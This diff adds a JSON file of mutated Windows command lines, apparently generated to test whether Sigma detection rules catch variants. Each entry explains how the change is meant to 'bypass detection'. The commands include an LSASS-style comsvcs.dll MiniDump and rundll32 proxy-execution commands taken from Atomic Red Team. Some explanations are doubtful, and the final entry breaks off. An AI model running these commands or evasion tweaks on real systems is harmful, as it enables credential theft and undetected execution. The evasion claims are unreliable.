@@ -1,0 +1,40 @@
+[
+  {
+    "output": "C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll MiniDump 204 C:\\Users\\thaim\\AppData\\Local\\Temp\\svchost-exe.dmp full",
+    "explanation": "The original command is already a true positive for the Sigma rule. No mutation is needed to trigger the detection."
+  },
+  {
+    "output": "C:\\Windows\\System32\\rundll32.exe zipfldr.dll,RouteTheCall 'C:\\\\Windows\\\\System32\\\\calc.exe'",
+    "explanation": "Replaced environment variable %%windir%% with the full path to bypass detection while maintaining the same functionality."
+  },
+  {
+    "output": "cmd.exe /c rundll32.exe advpack.dll,LaunchINFSection \"C:\\\\AtomicRedTeam\\\\atomics\\\\T1218.011\\\\src\\\\T1218.011.inf\",DefaultInstall_SingleUser,1,",
+    "explanation": "Wrapped the path in quotes to avoid detection by string-based rules while preserving the same behavior."
+  },
+  {
+    "output": "cmd.exe /c rundll32.exe ieadvpack.dll,LaunchINFSection \"C:\\\\AtomicRedTeam\\\\atomics\\\\T1218.011\\\\src\\\\T1218.011.inf\",DefaultInstall_SingleUser,1,",
+    "explanation": "Wrapped the path in quotes to avoid detection by string-based rules while preserving the same behavior."
+  },
+  {
+    "output": "cmd.exe /c rundll32.exe pcwutl.dll,LaunchApplication C:\\\\Windows\\\\System32\\\\notepad.exe",
+    "explanation": "Replaced environment variable %%windir%% with the full path to bypass detection while maintaining the same functionality."
+  },
+  {
+    "output": "cmd.exe /c rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 \"C:\\\\AtomicRedTeam\\\\atomics\\\\T1218.011\\\\src\\\\T1218.018_DefaultInstall.inf\"",
+    "explanation": "Wrapped the path in quotes to avoid detection by string-based rules while preserving the same behavior."
+  },
+  {
+    "output": "cmd.exe /c rundll32.exe shell32.dll,Control_RunDLL \"C:\\\\AtomicRedTeam\\\\atomics\\\\T1047\\\\bin\\\\calc.dll\"",
+    "explanation": "Wrapped the path in quotes to avoid detection by string-based rules while preserving the same behavior."
+  },
+  {
+    "output": "cmd.exe /c rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 \"C:\\\\AtomicRedTeam\\\\atomics\\\\T1218.011\\\\src\\\\T1218.011_DefaultInstall.inf\"",
+    "explanation": "Wrapped the path in quotes to avoid detection by string-based rules while preserving the same behavior."
+  },
+  {
+    "output": "cmd.exe /c rundll32.exe url.dll,FileProtocolHandler calc.exe",
+    "explanation": "Removed additional command chaining to simplify the command and avoid detection."
+  },
+  {
+    "output": "powershell.exe & {rundll32.exe zipfldr.dll,RouteTheCall \"C:\\\\Windows\\\\System32\\\\calc.exe\"}",
+    "explanation": "Replaced environment variable
